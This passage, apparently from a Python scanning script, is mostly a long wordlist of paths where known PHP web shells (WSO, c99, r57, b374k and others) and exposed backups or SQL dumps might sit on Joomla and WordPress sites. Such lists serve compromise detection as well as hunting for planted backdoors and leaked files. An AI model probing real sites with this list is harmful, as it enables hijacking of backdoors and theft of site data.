'/templates/rhuk_milkyway//up.php', '/templates/rhuk_milkyway//upload.php', '/templates/rhuk_milkyway//uploads.php', '/templates/rhuk_milkyway/shell.php', '/templates/rhuk_milkyway//amad.php', '/templates/rhuk_milkyway//t00.php', '/templates/rhuk_milkyway//dz.php', '/templates/rhuk_milkyway//site.rar', '/templates/rhuk_milkyway//Black.php', '/templates/rhuk_milkyway//site.tar.gz', '/templates/rhuk_milkyway//home.zip', '/templates/rhuk_milkyway//home.rar', '/templates/rhuk_milkyway//home.tar', '/templates/rhuk_milkyway//home.tar.gz', '/templates/rhuk_milkyway//forum.zip', '/templates/rhuk_milkyway//forum.rar', '/templates/rhuk_milkyway//forum.tar', '/templates/rhuk_milkyway//forum.tar.gz', '/templates/rhuk_milkyway//test.txt', '/templates/rhuk_milkyway//ftp.txt', '/templates/rhuk_milkyway//user.txt', '/templates/rhuk_milkyway//site.txt', '/templates/rhuk_milkyway//error_log', '/templates/rhuk_milkyway//error', '/templates/rhuk_milkyway//cpanel', '/templates/rhuk_milkyway//awstats', '/templates/rhuk_milkyway//site.sql', '/templates/rhuk_milkyway//vb.sql', '/templates/rhuk_milkyway//forum.sql', '/templates/rhuk_milkyway/r00t-s3c.php', '/templates/rhuk_milkyway/c.php', '/templates/rhuk_milkyway//backup.sql', '/templates/rhuk_milkyway//back.sql', '/templates/rhuk_milkyway//data.sql', '/templates/rhuk_milkyway/wp.rar/', '/templates/rhuk_milkyway/asp.aspx', '/templates/rhuk_milkyway/tmp/vaga.php', '/templates/rhuk_milkyway/tmp/killer.php', '/templates/rhuk_milkyway/whmcs.php', '/templates/rhuk_milkyway/abuhlail.php', '/templates/rhuk_milkyway/tmp/killer.php', '/templates/rhuk_milkyway/tmp/domaine.pl', '/templates/rhuk_milkyway/tmp/domaine.php', '/templates/rhuk_milkyway/useradmin/', '/templates/rhuk_milkyway/tmp/d0maine.php', '/templates/rhuk_milkyway/d0maine.php', '/templates/rhuk_milkyway/tmp/sql.php', '/templates/rhuk_milkyway/X.php', '/templates/rhuk_milkyway/123.php', '/templates/rhuk_milkyway/m.php', '/templates/rhuk_milkyway/b.php', '/templates/rhuk_milkyway/up.php', '/templates/rhuk_milkyway/tmp/dz1.php', '/templates/rhuk_milkyway/dz1.php', '/templates/rhuk_milkyway/forum.zip', '/templates/rhuk_milkyway/Symlink.php', '/templates/rhuk_milkyway/Symlink.pl', '/templates/rhuk_milkyway/forum.rar', '/templates/rhuk_milkyway/joomla.zip', '/templates/rhuk_milkyway/joomla.rar', '/templates/rhuk_milkyway/wp.php', '/templates/rhuk_milkyway/buck.sql', '/templates/rhuk_milkyway/sysadmin.php', '/templates/rhuk_milkyway/images/c99.php', '/templates/rhuk_milkyway/xd.php', '/templates/rhuk_milkyway/c100.php', '/templates/rhuk_milkyway/spy.aspx', '/templates/rhuk_milkyway/xd.php', '/templates/rhuk_milkyway/tmp/xd.php', '/templates/rhuk_milkyway/sym/root/home/', '/templates/rhuk_milkyway/billing/killer.php', '/templates/rhuk_milkyway/tmp/upload.php', '/templates/rhuk_milkyway/tmp/admin.php', '/templates/rhuk_milkyway/Server.php', '/templates/rhuk_milkyway/tmp/uploads.php', '/templates/rhuk_milkyway/tmp/up.php', '/templates/rhuk_milkyway/Server/', '/templates/rhuk_milkyway/wp-admin/c99.php', '/templates/rhuk_milkyway/tmp/priv8.php', '/templates/rhuk_milkyway/priv8.php', '/templates/rhuk_milkyway/cgi.pl/', '/templates/rhuk_milkyway/tmp/cgi.pl', '/templates/rhuk_milkyway/downloads/dom.php', '/templates/rhuk_milkyway/webadmin.html', '/templates/rhuk_milkyway/admins.php', '/templates/rhuk_milkyway/bluff.php', '/templates/rhuk_milkyway/king.jeen', '/templates/rhuk_milkyway/admins/', '/templates/rhuk_milkyway/admins.asp', '/templates/rhuk_milkyway/admins.php', '/templates/rhuk_milkyway/wp.zip', '/templates/rhuk_milkyway/WSO.php']
                shells = ['wsu.php', '15.php', '/wp-admin/marijuana.php', '/ntol.php', 'aa.php', '/wp-content/15.php', '/wp/wp-content/plugins/xsid/marijuana.php', '/wp/minishell.php', 'wso.php', 'wso-2.5.php', 'wos.php?login=wos', '1945.php?login=1945', 'wos.php', '1945.php', '45.php', 'cc.php', 'ls.php', 'system.php', 'cmd.php', 'rootx.php', 'adminer.php', 'jkt48_1.php', 'indonesia.php', 'php.php', 'b374k.php', '1n73ction.php', 'shell.php', 'sh3ll.php', 'root.php', 'bh.php', 'sbh.php', 'idca.php', 'indoxploit.php', 'indoxploit_shell.php', 'idca_shell.php', 'bejak.php', 'injection.php', 'gaza.php', 'andela.php', 'jkt48.php', 'backdoor.php', 'backd00r.php', '1337.php', 'komet.php', 'bekdur.php', 'bd.php', 'arab.php', 'xxx.php', 'c99.php', 'r57.php', 'webadmin.php', 'data.php', 'konten.php', 'kamu.php', 'iya.php', 'koe.php', 'gca.php', 'sj.php', 'shell.asp', 'R57.php', 'C99.php', 'inject.php', 'kdoor.php', 'index.php', 'o.php', 'mosok.php', 'v.php', 'i.php', 'a.php', 's.php', 'ap.php', 'you.php', '1.php', '2.php', '3.php', '4.php', '5.php', '6.php', '7.php', '8.php', '9.php', '10.php', '/wp-content/plugins/disqus-comment-system/WSO.php', '/wp-content/plugins/disqus-comment-system/dz.php', '/wp-content/plugins/disqus-comment-system/DZ.php', '/wp-content/plugins/disqus-comment-system/cpanel.php', '/wp-content/plugins/disqus-comment-system/cpn.php', '/wp-content/plugins/disqus-comment-system/sos.php', '/wp-content/plugins/disqus-comment-system/term.php', '/wp-content/plugins/disqus-comment-system/Sec-War.php', '/wp-content/plugins/disqus-comment-system/sql.php', '/wp-content/plugins/disqus-comment-system/ssl.php', '/wp-content/plugins/disqus-comment-system/mysql.php', '/wp-content/plugins/disqus-comment-system/WolF.php', '/wp-content/plugins/disqus-comment-system/madspot.php', '/wp-content/plugins/disqus-comment-system/Cgishell.pl', '/wp-content/plugins/disqus-comment-system/killer.php', '/wp-content/plugins/disqus-comment-system/changeall.php', '/wp-content/plugins/disqus-comment-system/2.php', '/wp-content/plugins/disqus-comment-system/Sh3ll.php', '/wp-content/plugins/disqus-comment-system/dz0.php', '/wp-content/plugins/disqus-comment-system/dam.php', '/wp-content/plugins/disqus-comment-system/user.php', '/wp-content/plugins/disqus-comment-system/dom.php', '/wp-content/plugins/disqus-comment-system/whmcs.php', '/wp-content/plugins/disqus-comment-system/vb.zip', '/wp-content/plugins/disqus-comment-system/r00t.php', '/wp-content/plugins/disqus-comment-system/c99.php', '/wp-content/plugins/disqus-comment-system/gaza.php', '/wp-content/plugins/disqus-comment-system/1.php', '/wp-content/plugins/disqus-comment-system/d0mains.php', '/wp-content/plugins/disqus-comment-system/madspotshell.php', '/wp-content/plugins/disqus-comment-system/info.php', '/wp-content/plugins/disqus-comment-system/egyshell.php', '/wp-content/plugins/disqus-comment-system/Sym.php', '/wp-content/plugins/disqus-comment-system/c22.php', '/wp-content/plugins/disqus-comment-system/c100.php', '/wp-content/plugins/disqus-comment-system/configuration.php', '/wp-content/plugins/disqus-comment-system/g.php', '/wp-content/plugins/disqus-comment-system/xx.pl', '/wp-content/plugins/disqus-comment-system/ls.php', '/wp-content/plugins/disqus-comment-system/Cpanel.php', '/wp-content/plugins/disqus-comment-system/k.php', '/wp-content/plugins/disqus-comment-system/zone-h.php', '/wp-content/plugins/disqus-comment-system/tmp/user.php', '/wp-content/plugins/disqus-comment-system/tmp/Sym.php', '/wp-content/plugins/disqus-comment-system/cp.php', '/wp-content/plugins/disqus-comment-system/tmp/madspotshell.php', '/wp-content/plugins/disqus-comment-system/tmp/root.php', '/wp-content/plugins/disqus-comment-system/tmp/whmcs.php', '/wp-content/plugins/disqus-comment-system/tmp/index.php', '/wp-content/plugins/disqus-comment-system/tmp/2.php', '/wp-content/plugins/disqus-comment-system/tmp/dz.php', '/wp-content/plugins/disqus-comment-system/tmp/cpn.php', '/wp-content/plugins/disqus-comment-system/tmp/changeall.php', '/wp-content/plugins/disqus-comment-system/tmp/Cgishell.pl', '/wp-content/plugins/disqus-comment-system/tmp/sql.php', '/wp-content/plugins/disqus-comment-system/0day.php', '/wp-content/plugins/disqus-comment-system/tmp/admin.php', '/wp-content/plugins/disqus-comment-system/L3b.php', '/wp-content/plugins/disqus-comment-system/d.php', '/wp-content/plugins/disqus-comment-system/tmp/d.php', '/wp-content/plugins/disqus-comment-system/tmp/L3b.php', '/wp-content/plugins/disqus-comment-system/sado.php', '/wp-content/plugins/disqus-comment-system/admin1.php', '/wp-content/plugins/disqus-comment-system/upload.php', '/wp-content/plugins/disqus-comment-system/up.php', '/wp-content/plugins/disqus-comment-system/vb.zip', '/wp-content/plugins/disqus-comment-system/vb.rar', '/wp-content/plugins/disqus-comment-system/admin2.asp', '/wp-content/plugins/disqus-comment-system/uploads.php', '/wp-content/plugins/disqus-comment-system/sa.php', '/wp-content/plugins/disqus-comment-system/sysadmins/', '/wp-content/plugins/disqus-comment-system/admin1/', '/wp-content/plugins/disqus-comment-system/sniper.php', '/wp-content/plugins/disqus-comment-system/images/Sym.php', '/wp-content/plugins/disqus-comment-system//r57.php', '/wp-content/plugins/disqus-comment-system/gzaa_spysl', '/wp-content/plugins/disqus-comment-system/sql-new.php', '/wp-content/plugins/disqus-comment-system//shell.php', '/wp-content/plugins/disqus-comment-system//sa.php', '/wp-content/plugins/disqus-comment-system//admin.php', '/wp-content/plugins/disqus-comment-system//sa2.php', '/wp-content/plugins/disqus-comment-system//2.php', '/wp-content/plugins/disqus-comment-system//gaza.php', '/wp-content/plugins/disqus-comment-system//up.php', '/wp-content/plugins/disqus-comment-system//upload.php', '/wp-content/plugins/disqus-comment-system//uploads.php', '/wp-content/plugins/disqus-comment-system/shell.php', '/wp-content/plugins/disqus-comment-system//amad.php', '/wp-content/plugins/disqus-comment-system//t00.php', 'pwp-content/plugins/disqus-comment-system/disqus.php', 'wp-content/plugins/akismet/WSO.php', 'wp-content/plugins/akismet/dz.php', 'wp-content/plugins/akismet/DZ.php', 'wp-content/plugins/akismet/cpanel.php', 'wp-content/plugins/akismet/cpn.php', 'wp-content/plugins/akismet/sos.php', 'wp-content/plugins/akismet/term.php', 'wp-content/plugins/akismet/Sec-War.php', 'wp-content/plugins/akismet/sql.php', 'wp-content/plugins/akismet/ssl.php', 'wp-content/plugins/akismet/mysql.php', 'wp-content/plugins/akismet/WolF.php', 'wp-content/plugins/akismet/madspot.php', 'wp-content/plugins/akismet/Cgishell.pl', 'wp-content/plugins/akismet/killer.php', 'wp-content/plugins/akismet/changeall.php', 'wp-content/plugins/akismet/2.php', 'wp-content/plugins/akismet/Sh3ll.php', 'wp-content/plugins/akismet/dz0.php', 'wp-content/plugins/akismet/dam.php', 'wp-content/plugins/akismet/user.php', 'wp-content/plugins/akismet/dom.php', 'wp-content/plugins/akismet/whmcs.php', 'wp-content/plugins/akismet/vb.zip', 'wp-content/plugins/akismet/r00t.php', 'wp-content/plugins/akismet/c99.php', 'wp-content/plugins/akismet/gaza.php', 'wp-content/plugins/akismet/1.php', 'wp-content/plugins/akismet/d0mains.php', 'wp-content/plugins/akismet/madspotshell.php', 'wp-content/plugins/akismet/info.php', 'wp-content/plugins/akismet/egyshell.php', 'wp-content/plugins/akismet/Sym.php', 'wp-content/plugins/akismet/c22.php', 'wp-content/plugins/akismet/c100.php', 'wp-content/plugins/akismet/configuration.php', 'wp-content/plugins/akismet/g.php', 'wp-content/plugins/akismet/xx.pl', 'wp-content/plugins/akismet/ls.php', 'wp-content/plugins/akismet/Cpanel.php', 'wp-content/plugins/akismet/k.php', 'wp-content/plugins/akismet/zone-h.php', 'wp-content/plugins/akismet/tmp/user.php', 'wp-content/plugins/akismet/tmp/Sym.php', 'wp-content/plugins/akismet/cp.php', 'wp-content/plugins/akismet/tmp/madspotshell.php', 'wp-content/plugins/akismet/tmp/root.php', 'wp-content/plugins/akismet/tmp/whmcs.php', 'wp-content/plugins/akismet/tmp/index.php', 'wp-content/plugins/akismet/tmp/2.php', 'wp-content/plugins/akismet/tmp/dz.php', 'wp-content/plugins/akismet/tmp/cpn.php', 'wp-content/plugins/akismet/tmp/changeall.php', 'wp-content/plugins/akismet/tmp/Cgishell.pl', 'wp-content/plugins/akismet/tmp/sql.php', 'wp-content/plugins/akismet/0day.php', 'wp-content/plugins/akismet/tmp/admin.php', 'wp-content/plugins/akismet/L3b.php', 'wp-content/plugins/akismet/d.php', 'wp-content/plugins/akismet/tmp/d.php', 'wp-content/plugins/akismet/tmp/L3b.php', 'wp-content/plugins/akismet/sado.php', 'wp-content/plugins/akismet/admin1.php', 'wp-content/plugins/akismet/upload.php', 'wp-content/plugins/akismet/up.php', 'wp-content/plugins/akismet/vb.zip', 'wp-content/plugins/akismet/vb.rar', 'wp-content/plugins/akismet/admin2.asp', 'wp-content/plugins/akismet/uploads.php', 'wp-content/plugins/akismet/sa.php', 'wp-content/plugins/akismet/sysadmins/', 'wp-content/plugins/akismet/admin1/', 'wp-content/plugins/akismet/sniper.php', 'wp-content/plugins/akismet/images/Sym.php', 'wp-content/plugins/akismet//r57.php', 'wp-content/plugins/akismet/gzaa_spysl', 'wp-content/plugins/akismet/sql-new.php', 'wp-content/plugins/akismet//shell.php', 'wp-content/plugins/akismet//sa.php', 'wp-content/plugins/akismet//admin.php', 'wp-content/plugins/akismet//sa2.php', 'wp-content/plugins/akismet//2.php', 'wp-content/plugins/akismet//gaza.php', 'wp-content/plugins/akismet//up.php', 'wp-content/plugins/akismet//upload.php', 'wp-content/plugins/akismet//uploads.php', 'wp-content/plugins/akismet/shell.php', 'wp-content/plugins/akismet//amad.php', 'wp-content/plugins/akismet//t00.php', 'wp-content/plugins/akismet//dz.php', 'wp-content/plugins/akismet//site.rar', 'wp-content/plugins/akismet//Black.php', 'wp-content/plugins/akismet//site.tar.gz', 'wp-content/plugins/akismet//home.zip', 'wp-content/plugins/akismet//home.rar', 'wp-content/plugins/akismet//home.tar', 'wp-content/plugins/akismet//home.tar.gz', 'wp-content/plugins/akismet//forum.zip', 'wp-content/plugins/akismet//forum.rar', 'wp-content/plugins/akismet//forum.tar', 'wp-content/plugins/akismet//forum.tar.gz', 'wp-content/plugins/akismet//test.txt', 'wp-content/plugins/akismet//ftp.txt', 'wp-content/plugins/akismet//user.txt', 'wp-content/plugins/akismet//site.txt', 'wp-content/plugins/akismet//error_log', 'wp-content/plugins/akismet//error', 'wp-content/plugins/akismet//cpanel', 'wp-content/plugins/akismet//awstats', 'wp-content/plugins/akismet//site.sql', 'wp-content/plugins/akismet//vb.sql', 'wp-content/plugins/akismet//forum.sql', 'wp-content/plugins/akismet/r00t-s3c.php', 'wp-content/plugins/akismet/c.php', 'wp-content/plugins/akismet//backup.sql', 'wp-content/plugins/akismet//back.sql', 'wp-content/plugins/akismet//data.sql', 'wp-content/plugins/akismet/wp.rar/', 'wp-content/plugins/akismet/asp.aspx', 'wp-content/plugins/akismet/tmp/vaga.php', 'wp-content/plugins/akismet/tmp/killer.php', 'wp-content/plugins/akismet/whmcs.php', 'wp-content/plugins/akismet/abuhlail.php', 'wp-content/plugins/akismet/tmp/killer.php', 'wp-content/plugins/akismet/tmp/domaine.pl', 'wp-content/plugins/akismet/tmp/domaine.php', 'wp-content/plugins/akismet/useradmin/', 'wp-content/plugins/akismet/tmp/d0maine.php', 'wp-content/plugins/akismet/d0maine.php', 'wp-content/plugins/akismet/tmp/sql.php', 'wp-content/plugins/akismet/X.php', 'wp-content/plugins/akismet/123.php', 'wp-content/plugins/akismet/m.php', 'wp-content/plugins/akismet/b.php', 'wp-content/plugins/akismet/up.php', 'wp-content/plugins/akismet/tmp/dz1.php', 'wp-content/plugins/akismet/dz1.php', 'wp-content/plugins/akismet/forum.zip', 'wp-content/plugins/akismet/Symlink.php', 'wp-content/plugins/akismet/Symlink.pl', 'wp-content/plugins/akismet/forum.rar', 'wp-content/plugins/akismet/joomla.zip', 'wp-content/plugins/akismet/joomla.rar', 'wp-content/plugins/akismet/wp.php', 'wp-content/plugins/akismet/buck.sql', 'wp-content/plugins/akismet/sysadmin.php', 'wp-content/plugins/akismet/images/c99.php', 'wp-content/plugins/akismet/xd.php', 'wp-content/plugins/akismet/c100.php', 'wp-content/plugins/akismet/spy.aspx', 'wp-content/plugins/akismet/xd.php', 'wp-content/plugins/akismet/tmp/xd.php', 'wp-content/plugins/akismet/sym/root/home/', 'wp-content/plugins/akismet/billing/killer.php', 'wp-content/plugins/akismet/tmp/upload.php', 'wp-content/plugins/akismet/tmp/admin.php', 'wp-content/plugins/akismet/Server.php', 'wp-content/plugins/akismet/tmp/uploads.php', 'wp-content/plugins/akismet/tmp/up.php', 'wp-content/plugins/akismet/Server/', 'wp-content/plugins/akismet/wp-admin/c99.php', 'wp-content/plugins/akismet/tmp/priv8.php', 'wp-content/plugins/akismet/priv8.php', 'wp-content/plugins/akismet/cgi.pl/', 'wp-content/plugins/akismet/tmp/cgi.pl', 'wp-content/plugins/akismet/downloads/dom.php', 'wp-content/plugins/akismet/webadmin.html', 'wp-content/plugins/akismet/admins.php', 'wp-content/plugins/akismet/bluff.php', 'wp-content/plugins/akismet/king.jeen', 'wp-content/plugins/akismet/admins/', 'wp-content/plugins/akismet/admins.asp', 'wp-content/plugins/akismet/admins.php', 'wp-content/plugins/akismet/wp.zip', 'wp-content/plugins/akismet/disqus.php', 'wp-content/plugins/google-sitemap-generator//cpanel', 'wp-content/plugins/google-sitemap-generator//awstats', 'wp-content/plugins/google-sitemap-generator//site.sql', 'wp-content/plugins/google-sitemap-generator//vb.sql', 'wp-content/plugins/google-sitemap-generator//forum.sql', 'wp-content/plugins/google-sitemap-generator/r00t-s3c.php', 'wp-content/plugins/google-sitemap-generator/c.php', 'wp-content/plugins/google-sitemap-generator//backup.sql', 'wp-content/plugins/google-sitemap-generator//back.sql', 'wp-content/plugins/google-sitemap-generator//data.sql', 'wp-content/plugins/google-sitemap-generator/wp.rar/', 'wp-content/plugins/google-sitemap-generator/asp.aspx', 'wp-content/plugins/google-sitemap-generator/tmp/vaga.php', 'wp-content/plugins/google-sitemap-generator/tmp/killer.php', 'wp-content/plugins/google-sitemap-generator/whmcs.php', 'wp-content/plugins/google-sitemap-generator/abuhlail.php', 'wp-content/plugins/google-sitemap-generator/tmp/killer.php', 'wp-content/plugins/google-sitemap-generator/tmp/domaine.pl', 'wp-content/plugins/google-sitemap-generator/tmp/domaine.php', 'wp-content/plugins/google-sitemap-generator/useradmin/', 'wp-content/plugins/google-sitemap-generator/tmp/d0maine.php', 'wp-content/plugins/google-sitemap-generator/d0maine.php', 'wp-content/plugins/google-sitemap-generator/tmp/sql.php', 'wp-content/plugins/google-sitemap-generator/X.php', 'wp-content/plugins/google-sitemap-generator/123.php', 'wp-content/plugins/google-sitemap-generator/m.php', 'wp-content/plugins/google-sitemap-generator/b.php', 'wp-content/plugins/google-sitemap-generator/up.php', 'wp-content/plugins/google-sitemap-generator/tmp/dz1.php', 'wp-content/plugins/google-sitemap-generator/dz1.php', 'wp-content/plugins/google-sitemap-generator/forum.zip', 'wp-content/plugins/google-sitemap-generator/Symlink.php', 'wp-content/plugins/google-sitemap-generator/Symlink.pl', 'wp-content/plugins/google-sitemap-generator/forum.rar', 'wp-content/plugins/google-sitemap-generator/joomla.zip', 'wp-content/plugins/google-sitemap-generator/joomla.rar', 'wp-content/plugins/google-sitemap-generator/wp.php', 'wp-content/plugins/google-sitemap-generator/buck.sql', 'wp-content/plugins/google-sitemap-generator/sysadmin.php', 'wp-content/plugins/google-sitemap-generator/images/c99.php', 'wp-content/plugins/google-sitemap-generator/xd.php', 'wp-content/plugins/google-sitemap-generator/c100.php', 'wp-content/plugins/google-sitemap-generator/spy.aspx', 'wp-content/plugins/google-sitemap-generator/xd.php', 'wp-content/plugins/google-sitemap-generator/tmp/xd.php', 'wp-content/plugins/google-sitemap-generator/sym/root/home/', 'wp-content/plugins/google-sitemap-generator/billing/killer.php', 'wp-content/plugins/google-sitemap-generator/tmp/upload.php', 'wp-content/plugins/google-sitemap-generator/tmp/admin.php', 'wp-content/plugins/google-sitemap-generator/Server.php', 'wp-content/plugins/google-sitemap-generator/tmp/uploads.php', 'wp-content/plugins/google-sitemap-generator/tmp/up.php', 'wp-content/plugins/google-sitemap-generator/Server/', 'wp-content/plugins/google-sitemap-generator/wp-admin/c99.php', 'wp-content/plugins/google-sitemap-generator/tmp/priv8.php', 'wp-content/plugins/google-sitemap-generator/priv8.php', 'wp-content/plugins/google-sitemap-generator/cgi.pl/', 'wp-content/plugins/google-sitemap-generator/tmp/cgi.pl', 'wp-content/plugins/google-sitemap-generator/downloads/dom.php', 'wp-content/plugins/google-sitemap-generator/webadmin.html', 'wp-content/plugins/google-sitemap-generator/admins.php', 'wp-content/plugins/google-sitemap-generator/bluff.php', 'wp-content/plugins/google-sitemap-generator/king.jeen', 'wp-content/plugins/google-sitemap-generator/admins/', 'wp-content/plugins/google-sitemap-generator/admins.asp', 'wp-content/plugins/google-sitemap-generator/admins.php', 'wp-content/plugins/google-sitemap-generator/wp.zip', 'wp-content/plugins/google-sitemap-generator/sitemap-core.php', '/templates/beez/WSO.php', '/templates/beez/dz.php', '/templates/beez/DZ.php', '/templates/beez/cpanel.php', '/templates/beez/cpn.php', '/templates/beez/sos.php', '/templates/beez/term.php', '/templates/beez/Sec-War.php', '/templates/beez/sql.php', '/templates/beez/ssl.php', '/templates/beez/mysql.php', '/templates/beez/WolF.php', '/templates/beez/madspot.php', '/templates/beez/Cgishell.pl', '/templates/beez/killer.php', '/templates/beez/changeall.php', '/templates/beez/2.php', '/templates/beez/Sh3ll.php', '/templates/beez/dz0.php', '/templates/beez/dam.php', '/templates/beez/user.php', '/templates/beez/dom.php', '/templates/beez/whmcs.php', '/templates/beez/vb.zip', '/templates/beez/r00t.php', '/templates/beez/c99.php', '/templates/beez/gaza.php', '/templates/beez/1.php', '/templates/beez/d0mains.php', '/templates/beez/madspotshell.php', '/templates/beez/info.php', '/templates/beez/egyshell.php', '/templates/beez/Sym.php', '/templates/beez/c22.php', '/templates/beez/c100.php', '/templates/beez/configuration.php', '/templates/beez/g.php', '/templates/beez/xx.pl', '/templates/beez/ls.php', '/templates/beez/Cpanel.php', '/templates/beez/k.php', '/templates/beez/zone-h.php', '/templates/beez/tmp/user.php', '/templates/beez/tmp/Sym.php', '/templates/beez/cp.php', '/templates/beez/tmp/madspotshell.php', '/templates/beez/tmp/root.php', '/templates/beez/tmp/whmcs.php', '/templates/beez/tmp/index.php', '/templates/beez/tmp/2.php', '/templates/beez/tmp/dz.php', '/templates/beez/tmp/cpn.php', '/templates/beez/tmp/changeall.php', '/templates/beez/tmp/Cgishell.pl', '/templates/beez/tmp/sql.php', '/templates/beez/0day.php', '/templates/beez/tmp/admin.php', '/templates/beez/L3b.php', '/templates/beez/d.php', '/templates/beez/tmp/d.php', '/templates/beez/tmp/L3b.php', '/templates/beez/sado.php', '/templates/beez/admin1.php', '/templates/beez/upload.php', '/templates/beez/up.php', '/templates/beez/vb.zip', '/templates/beez/vb.rar', '/templates/beez/admin2.asp', '/templates/beez/uploads.php', '/templates/beez/sa.php', '/templates/beez/sysadmins/', '/templates/beez/admin1/', '/templates/beez/sniper.php', '/templates/beez/images/Sym.php', '/templates/beez//r57.php', '/templates/beez/gzaa_spysl', '/templates/beez/sql-new.php', '/templates/beez//shell.php', '/templates/beez//sa.php', '/templates/beez//admin.php', '/templates/beez//sa2.php', '/templates/beez//2.php', '/templates/beez//gaza.php', '/templates/beez//up.php', '/templates/beez//upload.php', '/templates/beez//uploads.php', '/templates/beez/shell.php', '/templates/beez//amad.php', '/templates/beez//t00.php', '/templates/beez//dz.php', '/templates/beez//site.rar', '/templates/beez//Black.php', '/templates/beez//site.tar.gz', '/templates/beez//home.zip', '/templates/beez//home.rar', '/templates/beez//home.tar', '/templates/beez//home.tar.gz', '/templates/beez//forum.zip', '/templates/beez//forum.rar', '/templates/beez//forum.tar', '/templates/beez//forum.tar.gz', '/templates/beez//test.txt', '/templates/beez//ftp.txt', '/templates/beez//user.txt', '/templates/beez//site.txt', '/templates/beez//error_log', '/templates/beez//error', '/templates/beez//cpanel', '/templates/beez//awstats', '/templates/beez//site.sql', '/templates/beez//vb.sql', '/templates/beez//forum.sql', '/templates/beez/r00t-s3c.php', '/templates/beez/c.php', '/templates/beez//backup.sql', '/templates/beez//back.sql', '/templates/beez//data.sql', '/templates/beez/wp.rar/', '/templates/beez/asp.aspx', '/templates/beez/tmp/vaga.php', '/templates/beez/tmp/killer.php', '/templates/beez/whmcs.php', '/templates/beez/abuhlail.php', '/templates/beez/tmp/killer.php', '/templates/beez/tmp/domaine.pl', '/templates/beez/tmp/domaine.php', '/templates/beez/useradmin/', '/templates/beez/tmp/d0maine.php', '/templates/beez/d0maine.php', '/templates/beez/tmp/sql.php', '/templates/beez/X.php', '/templates/beez/123.php', '/templates/beez/m.php', '/templates/beez/b.php', '/templates/beez/up.php', '/templates/beez/tmp/dz1.php', '/templates/beez/dz1.php', '/templates/beez/forum.zip', '/templates/beez/Symlink.php', '/templates/beez/Symlink.pl', '/templates/beez/forum.rar', '/templates/beez/joomla.zip', '/templates/beez/joomla.rar', '/templates/beez/wp.php', '/templates/beez/buck.sql', '/templates/beez/sysadmin.php', '/templates/beez/images/c99.php', '/templates/beez/xd.php', '/templates/beez/c100.php', '/templates/beez/spy.aspx', '/templates/beez/xd.php', '/templates/beez/tmp/xd.php', '/templates/beez/sym/root/home/', '/templates/beez/billing/killer.php', '/templates/beez/tmp/upload.php', '/templates/beez/tmp/admin.php', '/templates/beez/Server.php', '/templates/beez/tmp/uploads.php', '/templates/beez/tmp/up.php', '/templates/beez/Server/', '/templates/beez/wp-admin/c99.php', '/templates/beez/tmp/priv8.php', '/templates/beez/priv8.php', '/templates/beez/cgi.pl/', '/templates/beez/tmp/cgi.pl', '/templates/beez/downloads/dom.php', '/templates/beez/webadmin.html', '/templates/beez/admins.php', '/templates/beez/bluff.php', '/templates/beez/king.jeen', '/templates/beez/admins/', '/templates/beez/admins.asp', '/templates/beez/admins.php', '/templates/beez/wp.zip', '/templates/beez/index.php/images/WSO.php', '/images/dz.php', '/images/DZ.php', '/images/cpanel.php', '/images/cpn.php', '/images/sos.php', '/images/term.php', '/images/Sec-War.php', '/images/sql.php', '/images/ssl.php', '/images/mysql.php', '/images/WolF.php', '/images/madspot.php', '/images/Cgishell.pl', '/images/killer.php', '/images/changeall.php', '/images/2.php', '/images/Sh3ll.php', '/images/dz0.php', '/images/dam.php', '/images/user.php', '/images/dom.php', '/images/whmcs.php', '/images/vb.zip', '/images/r00t.php', '/images/c99.php', '/images/gaza.php', '/images/1.php', '/images/d0mains.php', '/images/madspotshell.php', '/images/info.php', '/images/egyshell.php', '/images/Sym.php', '/images/c22.php', '/images/c100.php', '/images/configuration.php', '/images/g.php', '/images/xx.pl', '/images/ls.php', '/images/Cpanel.php', '/images/k.php', '/images/zone-h.php', '/images/tmp/user.php', '/images/tmp/Sym.php', '/images/cp.php', '/images/tmp/madspotshell.php', '/images/tmp/root.php', '/images/tmp/whmcs.php', '/images/tmp/index.php', '/images/tmp/2.php', '/images/tmp/dz.php', '/images/tmp/cpn.php', '/images/tmp/changeall.php', '/images/tmp/Cgishell.pl', '/images/tmp/sql.php', '/images/0day.php', '/images/tmp/admin.php', '/images/L3b.php', '/images/d.php', '/images/tmp/d.php', '/images/tmp/L3b.php', '/images/sado.php', '/images/admin1.php', '/images/upload.php', '/images/up.php', '/images/vb.zip', '/images/vb.rar', '/images/admin2.asp', '/images/uploads.php', '/images/sa.php', '/images/sysadmins/', '/images/admin1/', '/images/sniper.php', '/images/images/Sym.php', '/images//r57.php', '/images/gzaa_spysl', '/images/sql-new.php', '/images//shell.php', '/images//sa.php', '/images//admin.php', '/images//sa2.php', '/images//2.php', '/images//gaza.php', '/images//up.php', '/images//upload.php', '/images//uploads.php', '/images/shell.php', '/images//amad.php', '/images//t00.php', '/images//dz.php', '/images//site.rar', '/images//Black.php', '/images//site.tar.gz', '/images//home.zip', '/images//home.rar', '/images//home.tar', '/images//home.tar.gz', '/images//forum.zip', '/images//forum.rar', '/images//forum.tar', '/images//forum.tar.gz', '/images//test.txt', '/images//ftp.txt', '/images//user.txt', '/images//site.txt', '/images//error_log', '/images//error', '/images//cpanel', '/images//awstats', '/images//site.sql', '/images//vb.sql', '/images//forum.sql', '/images/r00t-s3c.php', '/images/c.php', '/images//backup.sql', '/images//back.sql', '/images//data.sql', '/images/wp.rar/', '/images/asp.aspx', '/images/tmp/vaga.php', '/images/tmp/killer.php', '/images/whmcs.php', '/images/abuhlail.php', '/images/tmp/killer.php', '/images/tmp/domaine.pl', '/images/tmp/domaine.php', '/images/useradmin/', '/images/tmp/d0maine.php', '/images/d0maine.php', '/images/tmp/sql.php', '/images/X.php', '/images/123.php', '/images/m.php', '/images/b.php', '/images/up.php', '/images/tmp/dz1.php', '/images/dz1.php', '/images/forum.zip', '/images/Symlink.php', '/images/Symlink.pl', '/images/forum.rar', '/images/joomla.zip', '/images/joomla.rar', '/images/wp.php', '/images/buck.sql', '/includes/WSO.php', '/includes/dz.php', '/includes/DZ.php', '/includes/cpanel.php', '/includes/cpn.php', '/includes/sos.php', '/includes/term.php', '/includes/Sec-War.php', '/includes/sql.php', '/includes/ssl.php', '/includes/mysql.php', '/includes/WolF.php', '/includes/madspot.php', '/includes/Cgishell.pl', '/includes/killer.php', '/includes/changeall.php', '/includes/2.php', '/includes/Sh3ll.php', '/includes/dz0.php', '/includes/dam.php', '/includes/user.php', '/includes/dom.php', '/includes/whmcs.php', '/includes/vb.zip', '/includes/r00t.php', '/includes/c99.php', '/includes/gaza.php', '/includes/1.php', '/includes/d0mains.php', 